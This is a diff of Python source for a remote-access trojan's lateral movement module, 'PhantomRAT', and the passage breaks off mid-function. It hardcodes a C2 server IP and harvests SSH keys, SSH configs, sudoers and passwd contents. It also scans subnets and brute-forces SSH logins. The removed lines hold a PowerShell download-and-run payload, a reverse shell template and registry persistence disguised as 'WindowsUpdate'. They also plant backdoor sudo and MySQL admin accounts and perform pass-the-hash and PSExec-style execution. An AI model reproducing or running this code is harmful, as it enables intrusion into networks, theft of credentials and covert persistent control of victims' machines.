@@ -1,984 +1,954 @@
+#!/usr/bin/env python3
+"""
+PhantomRAT Lateral Movement Module v4.0
+Advanced SSH/SMB/WinRM exploitation with credential harvesting and propagation.
+Enhanced for C2 v4.0 dashboard integration.
+"""
 
-import subprocess
 import os
-import paramiko
-import socket
-import time
+import sys
 import json
-import random
-import string
-import hashlib
+import time
+import socket
+import subprocess
 import threading
-import queue
-import re
+import paramiko
+import hashlib
+import base64
+import uuid
+import ipaddress
+import concurrent.futures
 from datetime import datetime
-import logging
-import smbclient
-import winrm
-import pymysql
-import psycopg2
-import pymssql
-import pymongo
-import redis
-import ldap3
-from impacket.smbconnection import SMBConnection
-from impacket.dcerpc.v5 import transport, srvs, scmr
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from pathlib import Path
 
-logger = logging.getLogger(__name__)
+# Try to import required libraries
+try:
+    import requests
+    import psutil
+    from cryptography.fernet import Fernet
+    import nmap
+    NMAP_AVAILABLE = True
+except ImportError as e:
+    print(f"[!] Missing dependency: {e}")
+    print("[*] Install with: pip install paramiko requests psutil python-nmap cryptography")
+    NMAP_AVAILABLE = False
+    sys.exit(1)
 
-class AdvancedLateralMovement:
-    """
-    Advanced lateral movement with multiple techniques and protocols
-    """
+# ==================== CONFIGURATION ====================
+C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
+SESSION_ID = str(uuid.uuid4())[:8]
+
+# Load profile if available
+try:
+    with open('malleable_profile.json', 'r') as f:
+        PROFILE = json.load(f)
+        USER_AGENT = PROFILE.get('security', {}).get('user_agent', 
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+except:
+    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+
+# ==================== ENCRYPTION ====================
+class PhantomEncryption:
+    """Encryption handler for C2 communication"""
     
-    def __init__(self, credential_store=None):
-        self.credential_store = credential_store or {}
-        self.session_manager = SessionManager()
-        self.techniques = {
-            'ssh': self._lateral_ssh,
-            'smb': self._lateral_smb,
-            'wmi': self._lateral_wmi,
-            'winrm': self._lateral_winrm,
-            'rdp': self._lateral_rdp,
-            'database': self._lateral_database,
-            'ssh_tunnel': self._lateral_ssh_tunnel,
-            'pass_the_hash': self._lateral_pth,
-            'pass_the_ticket': self._lateral_ptt,
-            'dcom': self._lateral_dcom,
-            'ps_exec': self._lateral_psexec
-        }
+    def __init__(self, key=None):
+        if key is None:
+            # Generate key from system info
+            system_hash = hashlib.sha256(
+                f"{socket.gethostname()}{os.getpid()}{time.time()}".encode()
+            ).digest()[:32]
+            key = system_hash
         
-        # Common payloads for execution
-        self.payloads = {
-            'download_exec': '''
-$url = "{url}"; 
-$output = "$env:TEMP\\{filename}"; 
-(New-Object System.Net.WebClient).DownloadFile($url, $output); 
-Start-Process $output
-''',
-            'reverse_shell': '''
-$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{{0}};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-}};
-$client.Close()
-''',
-            'persistence': '''
-# Add registry persistence
-New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
-    -Name "WindowsUpdate" -Value "{malware_path}" -PropertyType String -Force
-'''
-        }
+        if isinstance(key, str):
+            key = key.encode()
+        
+        # Ensure 32 bytes
+        if len(key) < 32:
+            key = key.ljust(32, b'0')[:32]
+        
+        fernet_key = base64.urlsafe_b64encode(key)
+        self.fernet = Fernet(fernet_key)
     
-    def lateral_move(self, target, technique='auto', payload=None, credentials=None):
-        """
-        Perform lateral movement to target
-        """
-        results = {
-            'target': target,
-            'technique': technique,
-            'success': False,
-            'timestamp': datetime.now().isoformat(),
-            'details': {}
-        }
+    def encrypt(self, data):
+        """Encrypt data for C2 transmission"""
+        if isinstance(data, dict):
+            data = json.dumps(data, separators=(',', ':'))
+        if isinstance(data, str):
+            data = data.encode('utf-8')
         
         try:
-            # Auto-detect technique if needed
-            if technique == 'auto':
-                technique = self._detect_best_technique(target)
+            return self.fernet.encrypt(data).decode('utf-8')
+        except:
+            return base64.b64encode(data).decode('utf-8')
+    
+    def decrypt(self, encrypted_data):
+        """Decrypt data from C2"""
+        try:
+            if isinstance(encrypted_data, str):
+                encrypted_data = encrypted_data.encode('utf-8')
             
-            # Get credentials
-            if not credentials:
-                credentials = self._get_credentials_for_target(target)
+            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
+            try:
+                return json.loads(decrypted)
+            except:
+                return decrypted
+        except:
+            try:
+                return base64.b64decode(encrypted_data).decode('utf-8')
+            except:
+                return None
+
+# Initialize encryption
+encryption = PhantomEncryption()
+
+# ==================== NETWORK DISCOVERY ====================
+class NetworkScanner:
+    """Advanced network scanner for lateral movement"""
+    
+    def __init__(self):
+        self.discovered_hosts = []
+        self.open_ports = {}
+        self.operating_systems = {}
+        
+    def get_local_network(self):
+        """Get local network information"""
+        try:
+            # Get local IP and subnet
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
             
-            # Execute lateral movement
-            if technique in self.techniques:
-                logger.info(f"Attempting lateral movement to {target} using {technique}")
-                
-                func = self.techniques[technique]
-                success, details = func(target, credentials, payload)
-                
-                results['success'] = success
-                results['details'] = details
-                results['technique_used'] = technique
-                
-                if success:
-                    logger.info(f"Successfully moved to {target}")
-                    # Establish persistent session
-                    self.session_manager.add_session(target, technique, credentials)
-                else:
-                    logger.warning(f"Failed to move to {target}: {details.get('error', 'Unknown error')}")
+            # Assume /24 subnet
+            subnet_base = '.'.join(local_ip.split('.')[:3])
+            return f"{subnet_base}.0/24"
+        except:
+            return "192.168.1.0/24"
+    
+    def arp_scan(self, subnet=None):
+        """Perform ARP scan for active hosts"""
+        if subnet is None:
+            subnet = self.get_local_network()
+        
+        print(f"[*] ARP scanning subnet: {subnet}")
+        active_hosts = []
+        
+        try:
+            # Simple ping sweep
+            network = ipaddress.ip_network(subnet, strict=False)
             
-            else:
-                results['details']['error'] = f"Unknown technique: {technique}"
-                logger.error(f"Unknown lateral movement technique: {technique}")
+            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+                futures = []
+                for ip in list(network.hosts())[:254]:  # Limit to 254 hosts
+                    futures.append(executor.submit(self.ping_host, str(ip)))
+                
+                for future in concurrent.futures.as_completed(futures):
+                    result = future.result()
+                    if result['alive']:
+                        active_hosts.append(result)
         
         except Exception as e:
-            results['details']['error'] = str(e)
-            logger.error(f"Lateral movement error: {e}")
+            print(f"[!] ARP scan error: {e}")
         
-        return results
+        self.discovered_hosts = active_hosts
+        return active_hosts
     
-    def _detect_best_technique(self, target):
-        """Detect best lateral movement technique for target"""
-        open_ports = self._scan_ports(target)
-        
-        # Check for common services
-        if 22 in open_ports:
-            return 'ssh'
-        elif 445 in open_ports:
-            return 'smb'
-        elif 5985 in open_ports or 5986 in open_ports:
-            return 'winrm'
-        elif 3389 in open_ports:
-            return 'rdp'
-        elif 135 in open_ports:
-            return 'wmi'
-        else:
-            # Try SMB as default for Windows
-            return 'smb'
+    def ping_host(self, ip, timeout=1):
+        """Ping a single host"""
+        try:
+            # Platform-specific ping command
+            param = '-n' if sys.platform.lower() == 'win32' else '-c'
+            command = ['ping', param, '1', '-W', str(timeout), ip]
+            
+            result = subprocess.run(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=timeout + 1
+            )
+            
+            return {
+                'ip': ip,
+                'alive': result.returncode == 0,
+                'hostname': socket.getfqdn(ip) if result.returncode == 0 else None
+            }
+        except:
+            return {'ip': ip, 'alive': False}
     
-    def _scan_ports(self, target, ports=None):
-        """Quick port scan"""
+    def port_scan(self, ip, ports=None):
+        """Scan ports on a host"""
         if ports is None:
-            ports = [22, 445, 135, 139, 3389, 5985, 5986]
+            ports = [22, 445, 3389, 5985, 5986]  # SSH, SMB, RDP, WinRM
         
         open_ports = []
         
-        for port in ports:
-            try:
+        try:
+            for port in ports:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                result = sock.connect_ex((target, port))
+                sock.settimeout(1)
+                result = sock.connect_ex((ip, port))
                 sock.close()
                 
                 if result == 0:
-                    open_ports.append(port)
+                    service = self.get_service_name(port)
+                    open_ports.append({
+                        'port': port,
+                        'service': service,
+                        'protocol': 'tcp'
+                    })
+        
+        except Exception as e:
+            print(f"[!] Port scan error for {ip}: {e}")
+        
+        self.open_ports[ip] = open_ports
+        return open_ports
+    
+    def get_service_name(self, port):
+        """Get service name from port number"""
+        service_map = {
+            22: 'SSH',
+            23: 'Telnet',
+            80: 'HTTP',
+            443: 'HTTPS',
+            445: 'SMB',
+            139: 'NetBIOS',
+            135: 'MSRPC',
+            3389: 'RDP',
+            5985: 'WinRM',
+            5986: 'WinRM SSL',
+            21: 'FTP',
+            25: 'SMTP',
+            110: 'POP3',
+            143: 'IMAP',
+            3306: 'MySQL',
+            5432: 'PostgreSQL',
+            27017: 'MongoDB'
+        }
+        return service_map.get(port, f'Unknown ({port})')
+    
+    def advanced_nmap_scan(self, ip):
+        """Perform advanced scan if nmap is available"""
+        if not NMAP_AVAILABLE:
+            return None
+        
+        try:
+            nm = nmap.PortScanner()
+            nm.scan(ip, arguments='-sV -O --script=banner')
+            
+            scan_info = {
+                'ip': ip,
+                'hostnames': nm[ip].hostnames() if ip in nm else [],
+                'os_info': nm[ip]['osmatch'] if ip in nm and 'osmatch' in nm[ip] else [],
+                'ports': []
+            }
+            
+            if ip in nm:
+                for proto in nm[ip].all_protocols():
+                    for port in nm[ip][proto]:
+                        port_info = nm[ip][proto][port]
+                        scan_info['ports'].append({
+                            'port': port,
+                            'state': port_info['state'],
+                            'service': port_info.get('name', 'unknown'),
+                            'version': port_info.get('version', 'unknown'),
+                            'product': port_info.get('product', 'unknown')
+                        })
+            
+            return scan_info
+        except Exception as e:
+            print(f"[!] Nmap scan error: {e}")
+            return None
+
+# ==================== CREDENTIAL HARVESTING ====================
+class CredentialHarvester:
+    """Harvest credentials from local system"""
+    
+    def __init__(self):
+        self.credentials = {
+            'ssh_keys': [],
+            'ssh_configs': [],
+            'browser_creds': [],
+            'system_creds': []
+        }
+    
+    def harvest_ssh_keys(self):
+        """Harvest SSH keys from common locations"""
+        ssh_keys = []
+        ssh_dirs = [
+            Path.home() / '.ssh',
+            Path('/etc/ssh'),
+            Path('/root/.ssh')
+        ]
+        
+        for ssh_dir in ssh_dirs:
+            if ssh_dir.exists():
+                for key_file in ssh_dir.glob('*'):
+                    if key_file.suffix in ['.pub', ''] and key_file.is_file():
+                        try:
+                            with open(key_file, 'r') as f:
+                                content = f.read()
+                                if 'PRIVATE KEY' in content or 'PUBLIC KEY' in content:
+                                    ssh_keys.append({
+                                        'path': str(key_file),
+                                        'content_preview': content[:200],
+                                        'size': len(content)
+                                    })
+                        except:
+                            pass
+        
+        self.credentials['ssh_keys'] = ssh_keys
+        return ssh_keys
+    
+    def harvest_ssh_configs(self):
+        """Harvest SSH configuration files"""
+        configs = []
+        config_files = [
+            Path.home() / '.ssh/config',
+            Path('/etc/ssh/ssh_config'),
+            Path('/etc/ssh/sshd_config')
+        ]
+        
+        for config_file in config_files:
+            if config_file.exists():
+                try:
+                    with open(config_file, 'r') as f:
+                        content = f.read()
+                        configs.append({
+                            'path': str(config_file),
+                            'content': content,
+                            'hosts': self.extract_ssh_hosts(content)
+                        })
+                except:
+                    pass
+        
+        self.credentials['ssh_configs'] = configs
+        return configs
+    
+    def extract_ssh_hosts(self, config_content):
+        """Extract SSH hosts from config"""
+        hosts = []
+        lines = config_content.split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            if line.startswith('Host ') and not line.startswith('Host *'):
+                hosts.extend(line[5:].split())
+        
+        return hosts
+    
+    def harvest_system_credentials(self):
+        """Harvest system credentials based on platform"""
+        creds = []
+        
+        if sys.platform == 'win32':
+            # Windows credential harvesting
+            try:
+                # Try to extract from Credential Manager
+                import win32cred
+                import win32security
+                
+                creds = self.harvest_windows_creds()
+            except ImportError:
+                print(f"[!] pywin32 not available for Windows credential harvesting")
+        
+        elif sys.platform in ['linux', 'darwin']:
+            # Linux/macOS credential harvesting
+            creds = self.harvest_unix_creds()
+        
+        self.credentials['system_creds'] = creds
+        return creds
+    
+    def harvest_windows_creds(self):
+        """Harvest Windows credentials"""
+        # This would require pywin32 and is OS-specific
+        # Simplified version for demonstration
+        return [{'type': 'windows', 'info': 'Credential harvesting requires pywin32'}]
+    
+    def harvest_unix_creds(self):
+        """Harvest Unix credentials"""
+        creds = []
+        
+        # Check for sudoers file
+        sudoers_path = Path('/etc/sudoers')
+        if sudoers_path.exists():
+            try:
+                with open(sudoers_path, 'r') as f:
+                    content = f.read()
+                    creds.append({
+                        'type': 'sudoers',
+                        'file': str(sudoers_path),
+                        'content': content
+                    })
             except:
                 pass
         
-        return open_ports
-    
-    def _get_credentials_for_target(self, target):
-        """Get credentials for target from store"""
-        # Check for exact match
-        if target in self.credential_store:
-            return self.credential_store[target]
-        
-        # Check for domain credentials
-        for cred_key, creds in self.credential_store.items():
-            if 'domain' in creds and creds['domain'] in target:
-                return creds
-        
-        # Use default credentials
-        default_creds = [
-            {'username': 'Administrator', 'password': 'Administrator'},
-            {'username': 'admin', 'password': 'admin'},
-            {'username': 'root', 'password': 'root'},
-            {'username': 'administrator', 'password': ''},
-            {'username': 'guest', 'password': ''}
-        ]
-        
-        return random.choice(default_creds)
-    
-    def _lateral_ssh(self, target, credentials, payload=None):
-        """Lateral movement via SSH"""
-        try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            
-            username = credentials.get('username', 'root')
-            password = credentials.get('password', '')
-            private_key = credentials.get('private_key')
-            
-            if private_key:
-                # Use private key authentication
-                key = paramiko.RSAKey.from_private_key_file(private_key)
-                ssh.connect(target, username=username, pkey=key, timeout=10)
-            else:
-                # Use password authentication
-                ssh.connect(target, username=username, password=password, timeout=10)
-            
-            # Execute payload
-            if payload:
-                stdin, stdout, stderr = ssh.exec_command(payload)
-                output = stdout.read().decode() + stderr.read().decode()
-            else:
-                # Default: create backdoor user
-                backdoor_user = f'backup_{random.randint(1000, 9999)}'
-                backdoor_pass = self._generate_password()
-                
-                commands = [
-                    f'sudo useradd -m -s /bin/bash {backdoor_user}',
-                    f'echo "{backdoor_user}:{backdoor_pass}" | sudo chpasswd',
-                    f'sudo usermod -aG sudo {backdoor_user}',
-                    f'echo "{backdoor_user} ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/{backdoor_user}'
-                ]
-                
-                output = ""
-                for cmd in commands:
-                    stdin, stdout, stderr = ssh.exec_command(cmd)
-                    output += stdout.read().decode() + stderr.read().decode()
-                
-                # Store credentials
-                self.credential_store[target] = {
-                    'username': backdoor_user,
-                    'password': backdoor_pass,
-                    'source': 'ssh_lateral'
-                }
-            
-            ssh.close()
-            
-            return True, {
-                'technique': 'ssh',
-                'output': output[:1000],  # Limit output size
-                'credentials_added': 'backdoor_user' in locals()
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'ssh'}
-    
-    def _lateral_smb(self, target, credentials, payload=None):
-        """Lateral movement via SMB"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            password = credentials.get('password', '')
-            domain = credentials.get('domain', '')
-            lmhash = credentials.get('lmhash', '')
-            nthash = credentials.get('nthash', '')
-            
-            # Connect via SMB
-            conn = SMBConnection(target, target)
-            
-            if lmhash and nthash:
-                # Pass-the-hash
-                conn.login(username, '', domain, lmhash, nthash)
-            else:
-                # Password authentication
-                conn.login(username, password, domain)
-            
-            # Check admin access
-            shares = conn.listShares()
-            
-            # Try to write to ADMIN$ share
+        # Check for password files
+        passwd_path = Path('/etc/passwd')
+        if passwd_path.exists():
             try:
-                conn.connectTree('ADMIN$')
-                
-                # Upload payload
-                if payload:
-                    # For Windows targets, create PowerShell payload
-                    ps_payload = self._create_ps_payload(payload)
-                    filename = f'update_{random.randint(1000, 9999)}.ps1'
-                    
-                    conn.createFile('ADMIN$', f'\\{filename}')
-                    file_handle = conn.openFile('ADMIN$', f'\\{filename}')
-                    conn.writeFile(file_handle, ps_payload.encode())
-                    conn.closeFile(file_handle)
-                    
-                    # Execute via service creation
-                    service_name = f'WindowsUpdate{random.randint(10000, 99999)}'
-                    
-                    sc_command = f'sc \\\\{target} create {service_name} binPath= "cmd /c powershell -ExecutionPolicy Bypass -File C:\\Windows\\{filename}"'
-                    sc_start = f'sc \\\\{target} start {service_name}'
-                    
-                    import subprocess
-                    subprocess.run(sc_command, shell=True, capture_output=True)
-                    subprocess.run(sc_start, shell=True, capture_output=True)
-                    
-                    output = f"Payload uploaded and executed as service {service_name}"
-                else:
-                    output = f"Successfully connected to {target} as {username}"
-                
-                conn.logoff()
-                
-                return True, {
-                    'technique': 'smb',
-                    'output': output,
-                    'shares': [share['shi1_netname'][:-1] for share in shares]
-                }
-                
-            except Exception as e:
-                conn.logoff()
-                return False, {'error': str(e), 'technique': 'smb'}
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'smb'}
-    
-    def _lateral_wmi(self, target, credentials, payload=None):
-        """Lateral movement via WMI"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            password = credentials.get('password', '')
-            domain = credentials.get('domain', '')
-            
-            # Create WMI connection
-            import wmi
-            wmi_conn = wmi.WMI(computer=target, user=username, password=password)
-            
-            # Execute command
-            if payload:
-                process_startup = wmi_conn.Win32_ProcessStartup.new()
-                process_startup.ShowWindow = 0  # Hidden window
-                
-                process_id, result = wmi_conn.Win32_Process.Create(
-                    CommandLine=payload,
-                    ProcessStartupInformation=process_startup
-                )
-                
-                output = f"Process created with PID {process_id}, result: {result}"
-            else:
-                # Get system information
-                os_info = wmi_conn.Win32_OperatingSystem()[0]
-                output = f"OS: {os_info.Caption}, Version: {os_info.Version}"
-            
-            return True, {
-                'technique': 'wmi',
-                'output': output
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'wmi'}
-    
-    def _lateral_winrm(self, target, credentials, payload=None):
-        """Lateral movement via WinRM"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            password = credentials.get('password', '')
-            
-            # Determine port
-            port = 5986  # HTTPS
-            try:
-                # Try HTTP first
-                session = winrm.Session(
-                    f'http://{target}:5985/wsman',
-                    auth=(username, password),
-                    transport='ntlm'
-                )
+                with open(passwd_path, 'r') as f:
+                    users = []
+                    for line in f:
+                        if ':/' in line:
+                            users.append(line.split(':')[0])
+                    creds.append({
+                        'type': 'passwd',
+                        'file': str(passwd_path),
+                        'users': users[:20]  # First 20 users
+                    })
             except:
-                # Try HTTPS
-                session = winrm.Session(
-                    f'https://{target}:5986/wsman',
-                    auth=(username, password),
-                    transport='ntlm',
-                    server_cert_validation='ignore'
-                )
-                port = 5986
-            
-            # Execute command
-            if payload:
-                result = session.run_ps(payload)
-                output = result.std_out.decode() + result.std_err.decode()
-            else:
-                # Get system info
-                result = session.run_cmd('systeminfo')
-                output = result.std_out.decode()[:500]  # First 500 chars
-            
-            return True, {
-                'technique': 'winrm',
-                'port': port,
-                'output': output
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'winrm'}
-    
-    def _lateral_rdp(self, target, credentials, payload=None):
-        """Lateral movement via RDP"""
-        try:
-            # This would use pyrdp or similar library
-            # For now, just check if RDP is accessible
-            
-            # Check RDP port
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            result = sock.connect_ex((target, 3389))
-            sock.close()
-            
-            if result == 0:
-                username = credentials.get('username', 'Administrator')
-                password = credentials.get('password', '')
-                
-                # Note: Actual RDP connection would go here
-                # For now, just report success
-                return True, {
-                    'technique': 'rdp',
-                    'message': 'RDP port accessible',
-                    'credentials': f'{username}:{password}'
-                }
-            else:
-                return False, {'error': 'RDP port not accessible', 'technique': 'rdp'}
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'rdp'}
-    
-    def _lateral_database(self, target, credentials, payload=None):
-        """Lateral movement via database connections"""
-        try:
-            # Try different database types
-            db_types = ['mysql', 'postgresql', 'mssql', 'mongodb', 'redis']
-            
-            for db_type in db_types:
-                try:
-                    if db_type == 'mysql':
-                        conn = pymysql.connect(
-                            host=target,
-                            user=credentials.get('username', 'root'),
-                            password=credentials.get('password', ''),
-                            database='mysql',
-                            connect_timeout=5
-                        )
-                        
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT VERSION()")
-                        version = cursor.fetchone()[0]
-                        
-                        # Try to create backdoor user
-                        backdoor_user = f'dbadmin_{random.randint(1000, 9999)}'
-                        backdoor_pass = self._generate_password()
-                        
-                        cursor.execute(f"CREATE USER '{backdoor_user}'@'%' IDENTIFIED BY '{backdoor_pass}'")
-                        cursor.execute(f"GRANT ALL PRIVILEGES ON *.* TO '{backdoor_user}'@'%' WITH GRANT OPTION")
-                        cursor.execute("FLUSH PRIVILEGES")
-                        
-                        conn.close()
-                        
-                        return True, {
-                            'technique': 'database',
-                            'type': 'mysql',
-                            'version': version,
-                            'backdoor_user': backdoor_user,
-                            'backdoor_pass': backdoor_pass
-                        }
-                    
-                    elif db_type == 'postgresql':
-                        conn = psycopg2.connect(
-                            host=target,
-                            user=credentials.get('username', 'postgres'),
-                            password=credentials.get('password', ''),
-                            database='postgres',
-                            connect_timeout=5
-                        )
-                        
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT version()")
-                        version = cursor.fetchone()[0]
-                        conn.close()
-                        
-                        return True, {
-                            'technique': 'database',
-                            'type': 'postgresql',
-                            'version': version
-                        }
-                    
-                    # Similar for other database types...
-                    
-                except:
-                    continue
-            
-            return False, {'error': 'No database connection succeeded', 'technique': 'database'}
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'database'}
-    
-    def _lateral_ssh_tunnel(self, target, credentials, payload=None):
-        """Create SSH tunnel for lateral movement"""
-        try:
-            # Establish SSH connection
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            
-            username = credentials.get('username', 'root')
-            password = credentials.get('password', '')
-            
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            # Create tunnel
-            transport = ssh.get_transport()
-            
-            # Forward local port to remote service
-            local_port = random.randint(10000, 20000)
-            remote_host = '127.0.0.1'
-            remote_port = 3389  # RDP as example
-            
-            transport.request_port_forward('', local_port)
-            channel = transport.open_channel(
-                'direct-tcpip',
-                (remote_host, remote_port),
-                ('', local_port)
-            )
-            
-            return True, {
-                'technique': 'ssh_tunnel',
-                'local_port': local_port,
-                'remote_host': remote_host,
-                'remote_port': remote_port,
-                'tunnel_active': channel.active if channel else False
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'ssh_tunnel'}
-    
-    def _lateral_pth(self, target, credentials, payload=None):
-        """Pass-the-hash attack"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            lmhash = credentials.get('lmhash', '')
-            nthash = credentials.get('nthash', '')
-            domain = credentials.get('domain', '')
-            
-            if not lmhash or not nthash:
-                return False, {'error': 'No hash provided', 'technique': 'pass_the_hash'}
-            
-            # Use impacket for PTH
-            from impacket.examples.secretsdump import RemoteOperations
-            
-            # This is simplified - actual implementation would be more complex
-            ro = RemoteOperations(target, username, '', domain, lmhash, nthash)
-            
-            # Try to dump secrets
-            secrets = ro.dumpSecrets()
-            
-            return True, {
-                'technique': 'pass_the_hash',
-                'secrets_dumped': bool(secrets),
-                'hashes': f'{lmhash}:{nthash}'
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'pass_the_hash'}
-    
-    def _lateral_ptt(self, target, credentials, payload=None):
-        """Pass-the-ticket attack"""
-        try:
-            # This would require Kerberos tickets
-            # Simplified implementation
-            
-            ticket = credentials.get('ticket')
-            if not ticket:
-                return False, {'error': 'No ticket provided', 'technique': 'pass_the_ticket'}
-            
-            # Set environment variable for Kerberos
-            import os
-            os.environ['KRB5CCNAME'] = ticket
-            
-            # Try to access resource
-            import subprocess
-            result = subprocess.run(['klist'], capture_output=True, text=True)
-            
-            return True, {
-                'technique': 'pass_the_ticket',
-                'ticket_valid': 'Ticket' in result.stdout,
-                'output': result.stdout[:200]
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'pass_the_ticket'}
-    
-    def _lateral_dcom(self, target, credentials, payload=None):
-        """Lateral movement via DCOM"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            password = credentials.get('password', '')
-            domain = credentials.get('domain', '')
-            
-            # Use impacket DCOM
-            from impacket.dcerpc.v5.transport import DCERPCTransportFactory
-            from impacket.dcerpc.v5 import scmr, rrp
-            
-            string_binding = r'ncacn_ip_tcp:%s' % target
-            transport = DCERPCTransportFactory(string_binding)
-            transport.set_credentials(username, password, domain)
-            
-            dce = transport.get_dce_rpc()
-            dce.connect()
-            dce.bind(scmr.MSRPC_UUID_SCMR)
-            
-            # Open service manager
-            resp = scmr.hROpenSCManagerW(dce)
-            sc_handle = resp['lpScHandle']
-            
-            return True, {
-                'technique': 'dcom',
-                'service_manager_accessible': True,
-                'sc_handle': sc_handle
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'dcom'}
-    
-    def _lateral_psexec(self, target, credentials, payload=None):
-        """Lateral movement via PSExec"""
-        try:
-            username = credentials.get('username', 'Administrator')
-            password = credentials.get('password', '')
-            domain = credentials.get('domain', '')
-            
-            # Use impacket's psexec
-            from impacket.examples.psexec import PSEXEC
-            
-            # This is simplified - actual PSExec would be more complex
-            psexec = PSEXEC(target, username, password, domain, '')
-            
-            # Execute command
-            if payload:
-                output = psexec.run(payload)
-            else:
-                output = psexec.run('whoami')
-            
-            return True, {
-                'technique': 'psexec',
-                'output': output[:500] if output else 'No output'
-            }
-            
-        except Exception as e:
-            return False, {'error': str(e), 'technique': 'psexec'}
-    
-    def _create_ps_payload(self, payload_type='download_exec', **kwargs):
-        """Create PowerShell payload"""
-        if payload_type in self.payloads:
-            template = self.payloads[payload_type]
-            return template.format(**kwargs)
-        else:
-            # Default payload
-            return 'Write-Host "PhantomRAT Lateral Movement"'
-    
-    def _generate_password(self, length=12):
-        """Generate random password"""
-        chars = string.ascii_letters + string.digits + '!@#$%^&*'
-        return ''.join(random.choice(chars) for _ in range(length))
+                pass
+        
+        return creds
 
-class SessionManager:
-    """Manage lateral movement sessions"""
+# ==================== BRUTE FORCE ATTACKS ====================
+class BruteForceEngine:
+    """Multi-protocol brute force engine"""
     
     def __init__(self):
-        self.sessions = {}
-        self.lock = threading.Lock()
-    
-    def add_session(self, target, technique, credentials):
-        """Add new session"""
-        with self.lock:
-            session_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:8]
-            self.sessions[session_id] = {
-                'target': target,
-                'technique': technique,
-                'credentials': credentials,
-                'created': datetime.now().isoformat(),
-                'last_used': datetime.now().isoformat(),
-                'active': True
-            }
-            return session_id
-    
-    def get_session(self, target):
-        """Get active session for target"""
-        with self.lock:
-            for session_id, session in self.sessions.items():
-                if session['target'] == target and session['active']:
-                    session['last_used'] = datetime.now().isoformat()
-                    return session_id, session
-        return None, None
-    
-    def close_session(self, session_id):
-        """Close session"""
-        with self.lock:
-            if session_id in self.sessions:
-                self.sessions[session_id]['active'] = False
-                return True
-        return False
-
-def brute_ssh(ip, user_list, pass_list, timeout=5):
-    """SSH brute force with improved logic"""
-    results = {
-        'ip': ip,
-        'success': False,
-        'credentials': None,
-        'attempts': 0,
-        'errors': []
-    }
-    
-    # Check if user_list and pass_list are files or lists
-    if isinstance(user_list, str) and os.path.exists(user_list):
-        with open(user_list, 'r') as f:
-            users = [line.strip() for line in f if line.strip()]
-    else:
-        users = user_list if isinstance(user_list, list) else [user_list]
-    
-    if isinstance(pass_list, str) and os.path.exists(pass_list):
-        with open(pass_list, 'r') as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    else:
-        passwords = pass_list if isinstance(pass_list, list) else [pass_list]
-    
-    # Try common credentials first
-    common_creds = [
-        ('root', 'root'),
-        ('admin', 'admin'),
-        ('administrator', ''),
-        ('user', 'user'),
-        ('test', 'test')
-    ]
-    
-    for user, password in common_creds:
-        try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(ip, username=user, password=password, timeout=timeout)
-            ssh.close()
-            
-            results['success'] = True
-            results['credentials'] = {'user': user, 'password': password}
-            return user, password
-            
-        except:
-            pass
-    
-    # Brute force remaining combinations
-    for user in users[:50]:  # Limit users
-        for password in passwords[:100]:  # Limit passwords per user
-            try:
-                results['attempts'] += 1
-                
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(ip, username=user, password=password, timeout=timeout)
-                ssh.close()
-                
-                results['success'] = True
-                results['credentials'] = {'user': user, 'password': password}
-                return user, password
-                
-            except paramiko.AuthenticationException:
-                continue
-            except Exception as e:
-                results['errors'].append(str(e))
-                continue
-    
-    return None, None
-
-def lateral_move(ip, user, password, technique='auto', payload=None):
-    """Main lateral movement function"""
-    try:
